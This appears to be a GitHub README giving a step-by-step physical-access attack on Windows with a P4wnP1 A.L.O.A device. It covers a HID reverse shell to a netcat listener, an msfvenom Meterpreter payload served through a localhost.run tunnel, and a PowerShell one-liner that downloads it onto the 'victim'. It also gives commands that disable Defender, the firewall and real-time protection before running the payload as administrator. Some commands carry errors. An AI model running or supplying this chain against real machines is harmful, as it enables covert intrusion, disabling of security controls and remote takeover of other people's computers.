
*Advanced Exploitation* Method using *P4wnP1 A.L.O.A*

-->> Physical Pentesting

![alt text](https://github.com/kaonashig/P4wnP1-Physical-Exploitation/blob/main/p1gif.gif)


Tools needed:


- Raspberry PI Zero W
- 32gb SD Card
- MicroUSB Cable
- NetCat
- MsfVenom
- MsfConsole
- SSH / Localhost.run

=

# *0. Build your own P4wnP1 A.L.O.A (Installing Guide)*

* Recommended ->> https://github.com/RoganDawes/P4wnP1_aloa
* Alternative ->> https://www.kali.org/docs/arm/raspberry-pi-zero-w-p4wnp1-aloa/ 

=

# *1. Plug p4wnp1 in victin machine and wait to the server go up (P4wnP1 Wifi AP Appears)*

* Connect to the AP using another device (smartphone), that will be used to run the HID scrips in the P4wnP1 Interface

= 

# *2. Run NetCat on your machine (laptop) -> your machine have to be connected to the same Network as your victins machine (Wifi or Ethernet)*

> nc -lvp 4443

=

# *3. Connect to the P4wnP1 server on your browser (172.24.0.1:8000) using your Smartphone and Run the RerverseShell Script on P4wnP1's HIDScripts Interface*

(dont forget to change the ip address on the script to your machine(laptop) ip)

* and... get a reverse shell!! ;)

=

# *4. Generate a Meterpreter ReverseShell payload using msfvenom and save it to /var/www/html path*

> sudo msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=YOURIP lport=443 -f exe -o /var/www/html/payloadName.exe

=

# *5. Run the apache2 service*

> sudo service apache2 start

# *6. Generate a SSH server using localhost.run*

![alt text](https://media.discordapp.net/attachments/893715225952534578/1152488259222507550/IMG_20230916_013642390.jpg?width=810&height=365)

> ssh key-gen
> ssh -R 80:localhost:80 localhost.run

* And copy the server link (the server will mirror the folder /var/www/html) 

and paste in this command ->   powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://sshserverlinkhere.lhr.life/payloadName.exe','C:/Users/user/Downloads/payloadName.exe')"

= 

# *7. Download your Payload on the Victin Machine by running the command above in the shell you got in netcat (victins machine powershell)*

![alt text](https://media.discordapp.net/attachments/893715225952534578/1152488260510158889/IMG_20230916_013637232.jpg?width=810&height=365)

Run the command in the shell you got using netcat
> powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://sshserverlinkhere.lhr.life/payloadName.exe','C:/Users/user/Downloads/payloadName.exe')"

*(this will download the payload to the C:/Users/user/Downloads/ folder)

= 

# *8. Run and set the Msfconsole*

> msfconsole

> set payload windows/x64/meterpreter/reverse_tcp

> set lhost YourIP

> set lport 443

> set exitonsession false

> exploit -j

= 

# *9. Disable All the security on the machine and get and exclusion path where your payload is located by running the commands below on the NetCat ReverseShell you got!*

> Add-MpPreference -ExclusionPath 'C:\Users\user\Downloads

> Disable-NetFirewallRule

> reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f.

> Set-MpPreference -DisableRealtimeMonitoring $false 

* (by doing this we are going to disable the Windows Security, Firewall, RealTime Protection and create an exclusionpath to the Downloads folder so the windows defender or antiviruses dont check on files on this path)

# *10. (FINALLY!) run the payload in the victin machine by running the commands bellow inside the NetCat ReverseShell terminal!*

> C:\Users\win\Downloads\payloadName.exe

//

# *10/2. (optional) Run the Payload as an administrator by using the following commands*

> whoami
* (get Computer and Admin name)

> C:\Users\user> runas /user:"ComputerName\AdminName" "C:\Users\win\Downloads\payloadName.exe"

=

![alt text](https://media.discordapp.net/attachments/893715225952534578/1152488260216569876/IMG_20230916_013631359.jpg?width=810&height=365)

* ->> Now if you did everything right you probably got an meterpreter reverseshell on your msfconsole terminal ;)


=

*Kaonashi/Knashi*

#* ->> *Happy Hacking!*
